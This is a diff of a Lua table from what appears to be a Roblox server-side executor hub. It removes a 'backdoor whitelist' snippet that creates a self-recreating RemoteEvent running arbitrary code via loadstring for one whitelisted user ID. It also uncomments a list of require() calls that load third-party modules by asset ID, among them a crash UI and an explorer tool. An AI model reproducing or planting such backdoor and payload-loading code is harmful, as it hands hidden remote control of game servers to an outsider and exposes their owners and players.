@@ -2865,31 +2865,6 @@ G2L_MODULES[G2L["90"]] = {
 Closure = function()
     local script = G2L["90"];
 return {
-happyhub.txt = "require(78790302691160):Hload('%username%')",
-backdoor whitelist.txt = [[
-local function createRemote()
-    local remote = Instance.new("RemoteEvent", game.ReplicatedStorage)
-    remote.Name = "skid"
-    remote.OnServerEvent:Connect(function(player, SS)
-        if player.UserId == %s then
-            loadstring(SS)()
-        else
-            -- player:Kick("")
-        end
-    end)
-    remote.AncestryChanged:Connect(function(_, parent)
-        if not parent then
-            -- warn("RemoteEvent deleted, recreating...")
-            createRemote()
-        end
-    end)
-
-    return remote
-end
-
-createRemote()
-]]
-    --[[
 	Dex = "require(4786706026):dex('%username%')",
 	Minecraft = "require(5820669639)('%username%')",
 	CrashUI = "require(6053693667).Crashexe('%username%')",
@@ -2904,7 +2879,6 @@ createRemote()
 	PoliceAI = "require(7163976217).VK('%username%')",
 	TankAI = "require(7203746402).tonk('%username%')",
 	JuggernautAI = "require(7486656912).Juggernaut('%username%')"
-    --]]
 }
 end;
 };
